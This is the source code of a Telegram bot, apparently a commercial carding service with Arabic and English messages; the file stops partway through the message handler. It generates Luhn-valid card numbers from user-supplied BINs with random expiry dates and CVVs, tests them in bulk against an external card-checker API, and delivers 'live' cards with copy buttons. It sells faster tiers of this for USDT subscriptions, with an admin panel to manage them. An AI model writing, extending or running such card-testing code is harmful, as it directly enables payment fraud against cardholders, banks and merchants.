const axios = require('axios');
const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');
const path = require('path');

const TOKEN = process.env.TOKEN;
if (!TOKEN) {
    console.error('❌ الرجاء تعيين متغير البيئة TOKEN');
    process.exit(1);
}

const bot = new TelegramBot(TOKEN, { polling: true });

// ==========================================
// قاعدة بيانات JSON
// ==========================================
const DATA_FILE = path.join(__dirname, 'data.json');

function loadData() {
    if (!fs.existsSync(DATA_FILE)) return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null };
    try {
        return JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
    } catch(e) { return { subscribers: {}, campaigns: {}, pendingPayments: [], paymentProofs: [], plans: null }; }
}

function saveData(data) {
    fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
}

// تحميل خطط الاشتراك (قابلة للتعديل من الأدمن)
function getPlans() {
    const data = loadData();
    if (!data.plans) {
        // الخطط الافتراضية مع إضافة حقل speed (نسبة السرعة 1-100)
        data.plans = {
            free: { nameAr: 'مجاني', nameEn: 'Free', price: 0, cardsLimit: 15, campaignsLimit: 2, speed: 1 },
            plus: { nameAr: 'Plus', nameEn: 'Plus', price: 3, cardsLimit: 70, campaignsLimit: 3, speed: 30 },
            pro: { nameAr: 'Pro', nameEn: 'Pro', price: 5, cardsLimit: 150, campaignsLimit: 5, speed: 60 },
            vip: { nameAr: 'VIP', nameEn: 'VIP', price: 8, cardsLimit: 350, campaignsLimit: 7, speed: 100 }
        };
        saveData(data);
    }
    return data.plans;
}

function updatePlans(newPlans) {
    const data = loadData();
    data.plans = newPlans;
    saveData(data);
}

// دوال المستخدمين
function getSubscriber(userId) {
    const data = loadData();
    const plans = getPlans();
    if (!data.subscribers[userId]) {
        data.subscribers[userId] = {
            plan: 'free',
            startDate: new Date().toISOString(),
            endDate: new Date(Date.now() + 365*24*60*60*1000).toISOString()
        };
        saveData(data);
    }
    const sub = data.subscribers[userId];
    if (sub.plan !== 'free' && new Date(sub.endDate) < new Date()) {
        sub.plan = 'free';
        sub.startDate = new Date().toISOString();
        sub.endDate = new Date(Date.now() + 365*24*60*60*1000).toISOString();
        saveData(data);
    }
    return sub;
}

function updateSubscriber(userId, updates) {
    const data = loadData();
    data.subscribers[userId] = { ...data.subscribers[userId], ...updates };
    saveData(data);
}

function getAllSubscribers() {
    const data = loadData();
    return data.subscribers;
}

// دوال الحملات
function getUserActiveCampaigns(userId) {
    const data = loadData();
    return Object.values(data.campaigns).filter(c => c.userId === userId && c.status === 'running');
}

function createCampaign(userId, bin, total) {
    const data = loadData();
    const id = Date.now() + Math.random();
    data.campaigns[id] = {
        id, userId, bin, total, current: 0, hit: 0, status: 'running', createdAt: new Date().toISOString()
    };
    saveData(data);
    return id;
}

function updateCampaign(campaignId, current, hit, status) {
    const data = loadData();
    if (data.campaigns[campaignId]) {
        if (current !== undefined) data.campaigns[campaignId].current = current;
        if (hit !== undefined) data.campaigns[campaignId].hit = hit;
        if (status !== undefined) data.campaigns[campaignId].status = status;
        saveData(data);
    }
}

// دوال الدفع والاشتراكات
function createPendingPayment(userId, plan, code) {
    const data = loadData();
    const plans = getPlans();
    const payment = {
        id: Date.now() + Math.random(),
        userId, plan, amount: plans[plan].price, code, status: 'waiting_payment', createdAt: new Date().toISOString()
    };
    data.pendingPayments.push(payment);
    saveData(data);
    return payment;
}

function getPendingPayment(userId, plan) {
    const data = loadData();
    return data.pendingPayments.find(p => p.userId === userId && p.plan === plan && p.status === 'waiting_payment');
}

function updatePendingPayment(id, status) {
    const data = loadData();
    const idx = data.pendingPayments.findIndex(p => p.id === id);
    if (idx !== -1) data.pendingPayments[idx].status = status;
    saveData(data);
}

function createPaymentProof(userId, plan, photoFileId, messageId) {
    const data = loadData();
    const proof = {
        id: Date.now() + Math.random(),
        userId, plan, photoFileId, messageId, status: 'pending', createdAt: new Date().toISOString()
    };
    data.paymentProofs.push(proof);
    saveData(data);
    return proof;
}

function getPaymentProof(id) {
    const data = loadData();
    return data.paymentProofs.find(p => p.id === id);
}

function updatePaymentProof(id, status) {
    const data = loadData();
    const idx = data.paymentProofs.findIndex(p => p.id === id);
    if (idx !== -1) data.paymentProofs[idx].status = status;
    saveData(data);
}

// ==========================================
// المتغيرات العامة
// ==========================================
const userLang = new Map(); // chatId -> 'ar'/'en'
const adminSet = new Set([643309456]);
const guessState = new Map(); // لكل مستخدم: { step, binsList, totalCards, cancelFlag, progressMsgId, animationInterval, muteProgress, currentCampaignIndex }

const BINANCE_PAY_ID = '842505320';

// ==========================================
// دوال مساعدة (Luhn, توليد، أعلام، أنواع البطاقات)
// ==========================================
const countryFlags = {
    'united states': '🇺🇸', 'usa': '🇺🇸', 'us': '🇺🇸',
    'united kingdom': '🇬🇧', 'uk': '🇬🇧', 'britain': '🇬🇧',
    'saudi arabia': '🇸🇦', 'ksa': '🇸🇦', 'saudi': '🇸🇦',
    'egypt': '🇪🇬', 'uae': '🇦🇪', 'kuwait': '🇰🇼', 'qatar': '🇶🇦',
    'bahrain': '🇧🇭', 'oman': '🇴🇲', 'jordan': '🇯🇴', 'lebanon': '🇱🇧',
    'iraq': '🇮🇶', 'syria': '🇸🇾', 'palestine': '🇵🇸', 'turkey': '🇹🇷',
    'germany': '🇩🇪', 'france': '🇫🇷', 'italy': '🇮🇹', 'spain': '🇪🇸',
    'netherlands': '🇳🇱', 'belgium': '🇧🇪', 'switzerland': '🇨🇭', 'austria': '🇦🇹',
    'russia': '🇷🇺', 'china': '🇨🇳', 'japan': '🇯🇵', 'south korea': '🇰🇷',
    'india': '🇮🇳', 'brazil': '🇧🇷', 'canada': '🇨🇦', 'mexico': '🇲🇽',
    'australia': '🇦🇺', 'indonesia': '🇮🇩', 'malaysia': '🇲🇾', 'singapore': '🇸🇬',
    'thailand': '🇹🇭', 'vietnam': '🇻🇳', 'philippines': '🇵🇭', 'pakistan': '🇵🇰',
    'bangladesh': '🇧🇩', 'south africa': '🇿🇦', 'nigeria': '🇳🇬', 'morocco': '🇲🇦',
    'algeria': '🇩🇿', 'tunisia': '🇹🇳', 'libya': '🇱🇾', 'sudan': '🇸🇩', 'yemen': '🇾🇪'
};

function getFlag(countryName) {
    if (!countryName) return '🌍';
    const lower = countryName.toLowerCase();
    for (const [key, flag] of Object.entries(countryFlags)) {
        if (lower.includes(key)) return flag;
    }
    return '🌍';
}

function getCardType(cardNumber) {
    const first = cardNumber[0];
    const two = cardNumber.slice(0,2);
    const four = cardNumber.slice(0,4);
    if (first === '4') return 'فيزا كارد';
    if (two >= '51' && two <= '55') return 'ماستر كارد';
    if (two === '34' || two === '37') return 'امريكان اكسبريس';
    if (four === '6011' || two === '65' || (two >= '64' && two <= '65')) return 'ديسكفر';
    if (two === '35') return 'جيه سي بي';
    if (two === '30' || two === '36' || two === '38' || two === '39') return 'دينرز كلوب';
    if (two === '50') return 'ميركاتيل';
    if (two === '56' || two === '57' || two === '58') return 'مايسترو';
    return 'بطاقة ائتمانية';
}

function checkLuhn(cardNumber) {
    let sum = 0, alt = false;
    for (let i = cardNumber.length-1; i >=0; i--) {
        let digit = parseInt(cardNumber[i],10);
        if (alt) { digit *= 2; if (digit > 9) digit -= 9; }
        sum += digit;
        alt = !alt;
    }
    return sum % 10 === 0;
}

function generateRandomMonth() { return String(Math.floor(Math.random()*12)+1).padStart(2,'0'); }
function generateRandomYear() { return String(new Date().getFullYear() + Math.floor(Math.random()*5)); }
function generateRandomCVV() { return String(Math.floor(Math.random()*900)+100); }

function generateCardNumber(bin, length=16) {
    let card = bin;
    while (card.length < length-1) card += Math.floor(Math.random()*10);
    for (let i=0; i<=9; i++) {
        const test = card + i;
        if (checkLuhn(test)) return test;
    }
    return card+'0';
}

function generateFullVisa(bin) {
    const num = generateCardNumber(bin);
    return `${num}|${generateRandomMonth()}|${generateRandomYear()}|${generateRandomCVV()}`;
}

function generateRandomCode() {
    return Math.random().toString(36).substring(2,10).toUpperCase();
}

// ==========================================
// دوال API لفحص البطاقات (مع دعم السرعة عبر التزامن)
// ==========================================
async function checkSingleCard(cardString, chatId, isSilent = false) {
    const parts = cardString.split('|');
    if (parts.length >=1 && !checkLuhn(parts[0])) return null;
    try {
        const response = await axios.post('https://api.chkr.cc/', { data: cardString }, {
            headers: { 'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json' },
            timeout: 10000
        });
        const data = response.data;
        const isLive = (data.code === 1);
        if (!isLive && !isSilent && data.message) return null;
        return {
            isLive,
            status: data.status || 'غير معروف',
            message: (data.message || '').replace(/احذفها/gi,'').trim(),
            type: (data.card && data.card.type) || getCardType(cardString.split('|')[0]),
            country: (data.card && data.card.country && data.card.country.name) || 'غير معروف'
        };
    } catch(e) {
        if (!isSilent) {
            const lang = userLang.get(chatId) || 'ar';
            await bot.sendMessage(chatId, translations[lang].api_error);
        }
        return null;
    }
}

// ==========================================
// دوال الأزرار والنسخ
// ==========================================
function getCopyButtons(fullCard, lang) {
    const [num, month, year, cvv] = fullCard.split('|');
    const dict = translations[lang];
    return {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.btn_copy_full, callback_data: `copy_full_${fullCard}` }],
                [{ text: dict.btn_copy_num, callback_data: `copy_num_${num}` }],
                [{ text: dict.btn_copy_exp, callback_data: `copy_exp_${month}|${year}` }],
                [{ text: dict.btn_copy_cvv, callback_data: `copy_cvv_${cvv}` }]
            ]
        }
    };
}

// ==========================================
// تأثير 3D متحرك
// ==========================================
function start3DAnimation(chatId, messageId, bin, totalCards, state) {
    const frames = ['3D   ', ' 3D  ', '  3D ', '   3D', '  3D ', ' 3D  '];
    let frameIndex = 0;
    const interval = setInterval(async () => {
        if (state.cancelFlag || state.muteProgress) {
            clearInterval(interval);
            return;
        }
        const frame = frames[frameIndex % frames.length];
        const text = `🔄 جاري إنشاء الفيزا ${state.currentCardIndex || 0}/${totalCards} ${frame}\n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`;
        try {
            await bot.editMessageText(text, { chat_id: chatId, message_id: messageId });
        } catch(e) {}
        frameIndex++;
    }, 300);
    return interval;
}

// ==========================================
// تشغيل حملة واحدة على BIN واحد مع دعم السرعة (التزامن)
// ==========================================
async function runSingleCampaign(chatId, bin, totalCards, campaignId, state, speedPercent) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    
    let progressMsg = await bot.sendMessage(chatId, `🔄 جاري إنشاء الفيزا 0/${totalCards} 3D   \n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`);
    state.progressMsgId = progressMsg.message_id;
    
    const animationInterval = start3DAnimation(chatId, progressMsg.message_id, bin, totalCards, state);
    state.animationInterval = animationInterval;
    
    let hit = 0;
    // تحديد حجم الدفعة المتزامنة بناءً على نسبة السرعة (كل 10% = دفعة إضافية، بحد أقصى 10 دفعات متزامنة)
    const batchSize = Math.min(10, Math.max(1, Math.floor(speedPercent / 10)));
    
    for (let i = 1; i <= totalCards; i += batchSize) {
        if (state.cancelFlag) break;
        const batch = [];
        const end = Math.min(i + batchSize - 1, totalCards);
        for (let j = i; j <= end; j++) {
            const fullVisa = generateFullVisa(bin);
            batch.push({ index: j, visa: fullVisa });
        }
        // تنفيذ الطلبات المتزامنة
        const results = await Promise.all(batch.map(item => checkSingleCard(item.visa, chatId, true)));
        for (let idx = 0; idx < results.length; idx++) {
            const result = results[idx];
            const currentIndex = batch[idx].index;
            const fullVisa = batch[idx].visa;
            state.currentCardIndex = currentIndex;
            // تحديث رسالة التقدم (يمكن تعديلها كل مرة أو بعد كل دفعة)
            if (!state.cancelFlag && !state.muteProgress) {
                try {
                    await bot.editMessageText(`🔄 جاري إنشاء الفيزا ${currentIndex}/${totalCards} ${frames[(currentIndex)%frames.length]}\n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`, { chat_id: chatId, message_id: progressMsg.message_id });
                } catch(e) {}
            }
            if (result && result.isLive) {
                hit++;
                if (animationInterval) clearInterval(animationInterval);
                try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
                
                const flag = getFlag(result.country);
                const cardType = getCardType(fullVisa.split('|')[0]);
                const liveText = dict.live_result.replace('{card}',fullVisa).replace('{type}',cardType).replace('{country}',result.country).replace('{flag}',flag);
                const buttons = getCopyButtons(fullVisa, lang);
                await bot.sendMessage(chatId, liveText, { parse_mode: 'Markdown', ...buttons });
                
                if (!state.cancelFlag && !state.muteProgress) {
                    progressMsg = await bot.sendMessage(chatId, `🔄 جاري إنشاء الفيزا ${currentIndex}/${totalCards} 3D   \n━━━━━━━━━━━━━━\n📌 BIN: ${bin}`);
                    state.progressMsgId = progressMsg.message_id;
                    const newInterval = start3DAnimation(chatId, progressMsg.message_id, bin, totalCards, state);
                    state.animationInterval = newInterval;
                }
            }
            updateCampaign(campaignId, currentIndex, hit, 'running');
        }
    }
    
    if (state.animationInterval) clearInterval(state.animationInterval);
    try { await bot.deleteMessage(chatId, progressMsg.message_id); } catch(e) {}
    
    if (hit === 0) {
        const noLive = dict.no_live_found.replace('{total}',totalCards);
        const keyboard = { reply_markup: { inline_keyboard: [[{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]] } };
        await bot.sendMessage(chatId, noLive, keyboard);
    } else {
        await bot.sendMessage(chatId, dict.summary.replace('{hit}',hit).replace('{total}',totalCards));
    }
    updateCampaign(campaignId, totalCards, hit, 'completed');
    return hit;
}

// ==========================================
// تشغيل عدة حملات على عدة BINs
// ==========================================
async function runMultipleCampaigns(chatId, binsList, totalCardsPerBin) {
    const subscriber = getSubscriber(chatId);
    const planName = subscriber.plan;
    const plans = getPlans();
    const allowedCampaigns = plans[planName].campaignsLimit;
    const speedPercent = plans[planName].speed;
    
    if (binsList.length > allowedCampaigns) {
        const lang = userLang.get(chatId) || 'ar';
        await bot.sendMessage(chatId, translations[lang].campaigns_limit_reached.replace('{limit}', allowedCampaigns));
        return;
    }
    
    let totalHits = 0;
    for (let idx = 0; idx < binsList.length; idx++) {
        const bin = binsList[idx];
        const campaignId = createCampaign(chatId, bin, totalCardsPerBin);
        const state = guessState.get(chatId);
        if (state.cancelFlag) break;
        
        await bot.sendMessage(chatId, `🚀 بدء الحملة ${idx+1}/${binsList.length} على BIN: ${bin}`);
        const hits = await runSingleCampaign(chatId, bin, totalCardsPerBin, campaignId, state, speedPercent);
        totalHits += hits;
    }
    
    if (!guessState.get(chatId)?.cancelFlag) {
        await bot.sendMessage(chatId, `🏁 انتهت جميع الحملات. إجمالي البطاقات الصالحة: ${totalHits}`);
    }
    guessState.delete(chatId);
}

// ==========================================
// دوال الاشتراكات والدفع
// ==========================================
async function handleSubscription(chatId, plan) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const subscriber = getSubscriber(chatId);
    const plans = getPlans();
    
    if (subscriber.plan === plan) {
        await bot.sendMessage(chatId, dict.already_subscribed.replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`]));
        const upgradeButtons = [];
        if (plan === 'plus') upgradeButtons.push({ text: dict.upgrade_to_pro, callback_data: 'sub_pro' });
        if (plan === 'pro') upgradeButtons.push({ text: dict.upgrade_to_vip, callback_data: 'sub_vip' });
        if (upgradeButtons.length) {
            await bot.sendMessage(chatId, dict.upgrade_suggestion, { reply_markup: { inline_keyboard: [upgradeButtons] } });
        }
        return;
    }
    
    const code = generateRandomCode();
    createPendingPayment(chatId, plan, code);
    const text = dict.subscribe_confirm
        .replace('{plan}', plans[plan][`name${lang==='ar'?'Ar':'En'}`])
        .replace('{amount}', plans[plan].price)
        .replace('{payId}', BINANCE_PAY_ID)
        .replace('{code}', code);
    await bot.sendMessage(chatId, text, { parse_mode: 'Markdown' });
    
    setTimeout(async () => {
        const pending = getPendingPayment(chatId, plan);
        if (pending && pending.status === 'waiting_payment') {
            await bot.sendMessage(chatId, dict.payment_timeout);
        }
    }, 20000);
}

// ==========================================
// عرض القوائم والأزرار
// ==========================================
async function showMainMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const opts = {
        reply_markup: {
            inline_keyboard: [
                [{ text: dict.btn_guess, callback_data: 'menu_guess' }],
                [{ text: dict.btn_single, callback_data: 'menu_single' }],
                [{ text: dict.btn_subscribe, callback_data: 'menu_subscribe' }],
                [{ text: dict.btn_my_campaigns, callback_data: 'menu_my_campaigns' }]
            ]
        },
        parse_mode: 'Markdown'
    };
    if (adminSet.has(chatId)) {
        opts.reply_markup.inline_keyboard.push([{ text: '⚙️ إدارة البوت', callback_data: 'admin_panel' }]);
    }
    await bot.sendMessage(chatId, dict.main_menu, opts);
}

async function showSubscriptionMenu(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const plans = getPlans();
    const buttons = [];
    for (const [key, plan] of Object.entries(plans)) {
        if (key !== 'free') {
            buttons.push([{ text: `${plan[`name${lang==='ar'?'Ar':'En'}`]} - ${plan.price} USDT`, callback_data: `sub_${key}` }]);
        }
    }
    buttons.push([{ text: dict.cancel_btn, callback_data: 'cancel' }]);
    await bot.sendMessage(chatId, dict.subscription_plans, { reply_markup: { inline_keyboard: buttons } });
}

async function showMyCampaigns(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const campaigns = getUserActiveCampaigns(chatId);
    if (campaigns.length === 0) {
        await bot.sendMessage(chatId, dict.no_active_campaigns);
        return;
    }
    let text = dict.active_campaigns;
    const buttons = [];
    for (const c of campaigns) {
        text += `\n📌 BIN: ${c.bin} | Progress: ${c.current}/${c.total} | Hits: ${c.hit}`;
        buttons.push([{ text: `${dict.campaign_stopped.split(' ')[0]} ${c.id}`, callback_data: `stop_camp_${c.id}` }]);
    }
    buttons.push([{ text: dict.new_campaign_btn, callback_data: 'menu_guess' }]);
    await bot.sendMessage(chatId, text, { reply_markup: { inline_keyboard: buttons } });
}

// ==========================================
// لوحة تحكم الأدمن (إدارة الخطط، منح/إلغاء الاشتراكات، تعديل السرعة)
// ==========================================
async function showAdminPanel(chatId) {
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    const keyboard = {
        inline_keyboard: [
            [{ text: '💰 تعديل الأسعار', callback_data: 'admin_edit_prices' }],
            [{ text: '⚡ تعديل السرعة', callback_data: 'admin_edit_speed' }],
            [{ text: '➕ إضافة خطة جديدة', callback_data: 'admin_add_plan' }],
            [{ text: '🎁 منح اشتراك لعضو', callback_data: 'admin_grant_sub' }],
            [{ text: '❌ إلغاء اشتراك عضو', callback_data: 'admin_remove_sub' }],
            [{ text: '📋 عرض جميع الأعضاء', callback_data: 'admin_list_users' }],
            [{ text: '🔙 رجوع', callback_data: 'main_menu' }]
        ]
    };
    await bot.sendMessage(chatId, '⚙️ لوحة تحكم الأدمن', keyboard);
}

// تعديل الأسعار
async function editPrices(chatId) {
    const plans = getPlans();
    let msg = 'الخطط الحالية:\n';
    for (const [key, plan] of Object.entries(plans)) {
        msg += `${key}: ${plan.price} USDT (${plan.cardsLimit} فيزا, ${plan.campaignsLimit} حملات, سرعة ${plan.speed}%)\n`;
    }
    msg += '\nأرسل الخطة والسعر الجديد بالصيغة: plan=price\nمثال: plus=4';
    await bot.sendMessage(chatId, msg);
    guessState.set(chatId, { step: 'admin_edit_price', cancelFlag: false });
}

// تعديل السرعة
async function editSpeed(chatId) {
    const plans = getPlans();
    let msg = 'الخطط الحالية وسرعتها:\n';
    for (const [key, plan] of Object.entries(plans)) {
        msg += `${key}: السرعة ${plan.speed}% (1-100)\n`;
    }
    msg += '\nأرسل الخطة والسرعة الجديدة بالصيغة: plan=speed\nمثال: pro=80';
    await bot.sendMessage(chatId, msg);
    guessState.set(chatId, { step: 'admin_edit_speed', cancelFlag: false });
}

async function addNewPlan(chatId) {
    await bot.sendMessage(chatId, 'أرسل تفاصيل الخطة الجديدة بالصيغة:\nname_ar|name_en|price|cardsLimit|campaignsLimit|speed\nمثال: ماكس|MAX|10|500|10|100');
    guessState.set(chatId, { step: 'admin_add_plan', cancelFlag: false });
}

async function grantSubscription(chatId) {
    await bot.sendMessage(chatId, 'أرسل معرف المستخدم والخطة بالصيغة: user_id plan\nمثال: 123456789 plus');
    guessState.set(chatId, { step: 'admin_grant', cancelFlag: false });
}

async function removeSubscription(chatId) {
    await bot.sendMessage(chatId, 'أرسل معرف المستخدم الذي تريد إلغاء اشتراكه');
    guessState.set(chatId, { step: 'admin_remove', cancelFlag: false });
}

async function listUsers(chatId) {
    const subscribers = getAllSubscribers();
    let msg = '📋 قائمة الأعضاء:\n';
    for (const [userId, sub] of Object.entries(subscribers)) {
        msg += `🆔 ${userId} | خطة: ${sub.plan} | ينتهي: ${sub.endDate}\n`;
    }
    await bot.sendMessage(chatId, msg);
}

// ==========================================
// أوامر البوت العامة
// ==========================================
bot.onText(/\/start/, async (msg) => {
    const chatId = msg.chat.id;
    const opts = {
        reply_markup: {
            inline_keyboard: [[{ text: 'العربية', callback_data: 'lang_ar' }, { text: 'English', callback_data: 'lang_en' }]]
        }
    };
    await bot.sendMessage(chatId, translations.ar.choose_lang, opts);
});

bot.onText(/\/menu/, async (msg) => { await showMainMenu(msg.chat.id); });
bot.onText(/\/cancel/, async (msg) => {
    const chatId = msg.chat.id;
    const state = guessState.get(chatId);
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    if (state) { state.cancelFlag = true; if (state.animationInterval) clearInterval(state.animationInterval); guessState.delete(chatId); await bot.sendMessage(chatId, dict.cancel_msg); }
    else await bot.sendMessage(chatId, '⚠️ لا توجد عملية نشطة.');
});

bot.onText(/\/addadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
    const id = parseInt(match[1]);
    if (isNaN(id)) return;
    adminSet.add(id);
    await bot.sendMessage(chatId, `✅ Added admin ${id}`);
});
bot.onText(/\/removeadmin (.+)/, async (msg, match) => {
    const chatId = msg.chat.id;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
    const id = parseInt(match[1]);
    if (id === 643309456) { await bot.sendMessage(chatId, '⚠️ Cannot remove main admin'); return; }
    adminSet.delete(id);
    await bot.sendMessage(chatId, `✅ Removed admin ${id}`);
});
bot.onText(/\/admins/, async (msg) => {
    const chatId = msg.chat.id;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
    await bot.sendMessage(chatId, `📋 Admins: ${Array.from(adminSet).join(', ')}`);
});

// ==========================================
// معالجة callback_query
// ==========================================
bot.on('callback_query', async (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];
    await bot.answerCallbackQuery(query.id);

    // أزرار النسخ
    if (data.startsWith('copy_full_')) {
        const full = data.replace('copy_full_','');
        await bot.sendMessage(chatId, `\`${full}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_num_')) {
        const num = data.replace('copy_num_','');
        await bot.sendMessage(chatId, `\`${num}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_exp_')) {
        const exp = data.replace('copy_exp_','');
        await bot.sendMessage(chatId, `\`${exp}\``, { parse_mode: 'Markdown' });
        return;
    }
    if (data.startsWith('copy_cvv_')) {
        const cvv = data.replace('copy_cvv_','');
        await bot.sendMessage(chatId, `\`${cvv}\``, { parse_mode: 'Markdown' });
        return;
    }

    // اللغة
    if (data === 'lang_ar') { userLang.set(chatId, 'ar'); await bot.sendMessage(chatId, translations.ar.lang_changed); await showMainMenu(chatId); return; }
    if (data === 'lang_en') { userLang.set(chatId, 'en'); await bot.sendMessage(chatId, translations.en.lang_changed); await showMainMenu(chatId); return; }

    // القائمة الرئيسية
    if (data === 'menu_guess') {
        guessState.set(chatId, { step: 'awaiting_bin', binsList: [], pendingBinCount: null, cancelFlag: false, muteProgress: false });
        const keyboard = {
            reply_markup: {
                inline_keyboard: [
                    [{ text: dict.cancel_btn, callback_data: 'cancel_guess' }]
                ]
            }
        };
        await bot.sendMessage(chatId, dict.enter_bin, { parse_mode: 'Markdown', ...keyboard });
        return;
    }
    if (data === 'menu_single') {
        await bot.sendMessage(chatId, dict.single_invalid, { parse_mode: 'Markdown' });
        return;
    }
    if (data === 'menu_subscribe') {
        await showSubscriptionMenu(chatId);
        return;
    }
    if (data === 'menu_my_campaigns') {
        await showMyCampaigns(chatId);
        return;
    }

    // إضافة BIN آخر (من قائمة القرار)
    if (data === 'add_another_bin') {
        const state = guessState.get(chatId);
        if (state && state.step === 'awaiting_bin_decision') {
            state.step = 'awaiting_bin';
            await bot.sendMessage(chatId, '📌 أرسل الـ BIN التالي:');
        }
        return;
    }

    // قفل الحملة وبدأ التخمين
    if (data === 'lock_and_start') {
        const state = guessState.get(chatId);
        if (!state || state.binsList.length === 0) {
            await bot.sendMessage(chatId, '⚠️ لم تقم بإدخال أي BIN بعد.');
            return;
        }
        if (state.totalCards === null) {
            await bot.sendMessage(chatId, '⚠️ يجب تحديد عدد الفيزات أولاً.');
            return;
        }
        state.step = 'running';
        await runMultipleCampaigns(chatId, state.binsList, state.totalCards);
        return;
    }

    // إلغاء العملية
    if (data === 'cancel_guess') {
        const state = guessState.get(chatId);
        if (state) { state.cancelFlag = true; if (state.animationInterval) clearInterval(state.animationInterval); guessState.delete(chatId); await bot.sendMessage(chatId, dict.cancel_msg); }
        return;
    }

    // إيقاف حملة
    if (data.startsWith('stop_camp_')) {
        const campId = parseFloat(data.split('_')[2]);
        updateCampaign(campId, null, null, 'stopped');
        await bot.sendMessage(chatId, dict.campaign_stopped.replace('{id}', campId));
        await showMyCampaigns(chatId);
        return;
    }

    // لوحة الأدمن
    if (data === 'admin_panel') {
        if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
        await showAdminPanel(chatId);
        return;
    }
    if (data === 'admin_edit_prices') {
        if (!adminSet.has(chatId)) return;
        await editPrices(chatId);
        return;
    }
    if (data === 'admin_edit_speed') {
        if (!adminSet.has(chatId)) return;
        await editSpeed(chatId);
        return;
    }
    if (data === 'admin_add_plan') {
        if (!adminSet.has(chatId)) return;
        await addNewPlan(chatId);
        return;
    }
    if (data === 'admin_grant_sub') {
        if (!adminSet.has(chatId)) return;
        await grantSubscription(chatId);
        return;
    }
    if (data === 'admin_remove_sub') {
        if (!adminSet.has(chatId)) return;
        await removeSubscription(chatId);
        return;
    }
    if (data === 'admin_list_users') {
        if (!adminSet.has(chatId)) return;
        await listUsers(chatId);
        return;
    }
    if (data === 'main_menu') {
        await showMainMenu(chatId);
        return;
    }

    // الاشتراكات
    if (data.startsWith('sub_')) {
        const planKey = data.replace('sub_', '');
        await handleSubscription(chatId, planKey);
        return;
    }

    // قبول/رفض الدفع من الأدمن
    if (data.startsWith('approve_payment_') || data.startsWith('reject_payment_')) {
        if (!adminSet.has(chatId)) { await bot.sendMessage(chatId, dict.not_admin); return; }
        const parts = data.split('_');
        const action = parts[0];
        const proofId = parseFloat(parts[2]);
        const proof = getPaymentProof(proofId);
        if (proof) {
            const plans = getPlans();
            if (action === 'approve') {
                const end = new Date();
                end.setMonth(end.getMonth() + 1);
                updateSubscriber(proof.userId, {
                    plan: proof.plan,
                    startDate: new Date().toISOString(),
                    endDate: end.toISOString()
                });
                updatePaymentProof(proofId, 'approved');
                const pending = getPendingPayment(proof.userId, proof.plan);
                if (pending) updatePendingPayment(pending.id, 'approved');
                const userLangCode = userLang.get(proof.userId) || 'ar';
                const userDict = translations[userLangCode];
                await bot.sendMessage(proof.userId, userDict.payment_approved.replace('{plan}', plans[proof.plan][`name${userLangCode==='ar'?'Ar':'En'}`]));
                await bot.sendMessage(chatId, `✅ تم تفعيل الاشتراك للمستخدم ${proof.userId}`);
            } else {
                updatePaymentProof(proofId, 'rejected');
                const userLangCode = userLang.get(proof.userId) || 'ar';
                const userDict = translations[userLangCode];
                await bot.sendMessage(proof.userId, userDict.payment_rejected);
                await bot.sendMessage(chatId, `❌ تم رفض الاشتراك للمستخدم ${proof.userId}`);
            }
        }
        return;
    }
});

// ==========================================
// معالجة الرسائل النصية (BIN، العدد، صور الدفع، فيزا واحدة، إدارة الأدمن)
// ==========================================
bot.on('message', async (msg) => {
    const chatId = msg.chat.id;
    const text = msg.text;
    const lang = userLang.get(chatId) || 'ar';
    const dict = translations[lang];

    // معالجة الصور (إثباتات الدفع)
    if (msg.photo) {
        const photo = msg.photo[msg.photo.length-1];
        const fileId = photo.file_id;
        const pendingItem = Object.values(loadData().pendingPayments).find(p => p.userId === chatId && p.status === 'waiting_payment');
        if (pendingItem) {
            const proof = createPaymentProof(chatId, pendingItem.plan, fileId, msg.message_id);
            const caption = `📸 New payment proof\nUser: ${chatId}\nPlan: ${pendingItem.plan}\nAmount: ${pendingItem.amount} USDT\nCode: ${pendingItem.code}`;
            const adminKeyboard = {
                reply_markup: {
                    inline_keyboard: [
                        [{ text: '✅ Approve', callback_data: `approve_payment_${proof.id}` }],
                        [{ text: '❌ Reject', callback_data: `reject_payment_${proof.id}` }]
                    ]
                }
            };
            for (const adminId of adminSet) {
                await bot.sendPhoto(adminId, fileId, { caption, ...adminKeyboard });
            }
            await bot.sendMessage(chatId, dict.payment_received);
            updatePendingPayment(pendingItem.id, 'proof_sent');
        } else {
            await bot.sendMessage(chatId, dict.api_error);
        }
        return;
    }

    // معالجة حالة انتظار إدخال BIN
    const state = guessState.get(chatId);
    if (state && state.step === 'awaiting_bin') {
        if (/^\d+$/.test(text)) {
            let bin = text.slice(0,6);
